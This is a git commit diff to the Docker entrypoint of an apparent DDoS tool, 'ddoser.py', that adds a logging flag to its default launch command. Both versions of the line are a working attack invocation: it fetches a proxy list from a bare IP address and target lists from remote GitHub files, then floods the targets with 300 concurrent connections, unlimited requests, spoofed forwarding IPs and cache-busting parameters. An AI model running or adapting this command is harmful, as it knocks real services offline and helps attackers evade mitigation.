4d22a721736ba76981775a1341f2cb92835c93a2
Shamrai Aleksandr <aleksandr.shamrai@together.com>
2022-03-03 20:11:38 +0200

    etnrypoint

--- docker-entrypoint.sh
+++ docker-entrypoint.sh
@@ -7,5 +7,5 @@ if [ "$1" != "" ]; then
   python3 ddoser.py "$@"
 else
   echo "Default params used"
-  python3 ddoser.py --proxy-url 'http://143.244.166.15/proxy.list' --target-urls-file 'https://raw.githubusercontent.com/imsamurai/ban/master/urls.txt' --target-urls-file https://github.com/hem017/cytro/raw/master/special_targets.txt --random-xff-ip --shuffle-proxy --concurrency 300 --count 0 --timeout 20 --user-agent 'Stop war against Ukraine!' --with-random-get-param --restart-period 600
+  python3 ddoser.py --proxy-url 'http://143.244.166.15/proxy.list' --target-urls-file 'https://raw.githubusercontent.com/imsamurai/ban/master/urls.txt' --target-urls-file https://github.com/hem017/cytro/raw/master/special_targets.txt --random-xff-ip --shuffle-proxy --concurrency 300 --count 0 --timeout 20 --user-agent 'Stop war against Ukraine!' --with-random-get-param --restart-period 600 --log-to-stdout
 fi
